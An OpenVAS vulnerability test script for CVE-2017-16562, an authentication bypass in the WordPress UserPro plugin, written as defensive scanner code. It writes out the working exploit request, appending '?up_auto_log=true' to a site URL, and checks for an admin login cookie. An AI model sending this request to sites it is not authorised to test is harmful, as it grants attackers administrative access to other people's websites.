###############################################################################
# OpenVAS Vulnerability Test
#
# WordPress UserPro Plugin Authentication Bypass
#
# Authors:
# Jan Philipp Schulte <jan.schulte@greenbone.net>
#
# Copyright:
# Copyright (C) 2017 Greenbone Networks GmbH, https://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if( description )
{
  script_oid("1.3.6.1.4.1.25623.1.0.113055");
  script_version("2020-05-08T08:34:44+0000");
  script_tag(name:"last_modification", value:"2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)");
  script_tag(name:"creation_date", value:"2017-11-21 14:19:20 +0100 (Tue, 21 Nov 2017)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_tag(name:"qod_type", value:"remote_app");

  script_tag(name:"solution_type", value:"VendorFix");

  script_cve_id("CVE-2017-16562");

  script_name("WordPress UserPro Plugin Authentication Bypass");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2017 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/installed");

  script_tag(name:"summary", value:"The WordPress UserPro plugin through version 4.9.17 is
  vulnerable to an authentication bypass attack.");

  script_tag(name:"vuldetect", value:"The script tries to bypass the authentication and reports
  the vulnerability if successful.");

  script_tag(name:"insight", value:"If the user 'admin' exists on the system, appending ?up_auto_log=true
  to the URL automatically logs in as that user.");

  script_tag(name:"impact", value:"Successful exploitation would allow the attacker to gain administrative
  access to the website.");

  script_tag(name:"affected", value:"WordPress UserPro plugin through version 4.9.17.");

  script_tag(name:"solution", value:"Upgrade WordPress UserPro plugin to version 4.9.17.1 or above.");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/43117/");
  script_xref(name:"URL", value:"https://wpvulndb.com/vulnerabilities/8950");

  exit(0);
}

CPE = "cpe:/a:wordpress:wordpress";

include( "host_details.inc" );
include( "http_func.inc" );
include( "http_keepalive.inc" );

if( ! port = get_app_port( cpe: CPE ) ) exit( 0 );
if( ! dir = get_app_location( port: port, cpe: CPE ) ) exit( 0 );

if( dir == "/" ) dir = "";
exploit = "/?up_auto_log=true";

# For future notice: http_vuln_check is not sufficient, reports NOT_VULN
url = dir + exploit;
req = http_get( port: port, item: url );
resp = http_keepalive_send_recv( port: port, data: req );

if( eregmatch( pattern: "Set-Cookie: wordpress_logged_in[^;]*admin", string: resp, icase: TRUE ) ) {
  report = http_report_vuln_url(  port: port, url: url );
  security_message( data: report, port: port );
  exit( 0 );
}

exit( 99 );
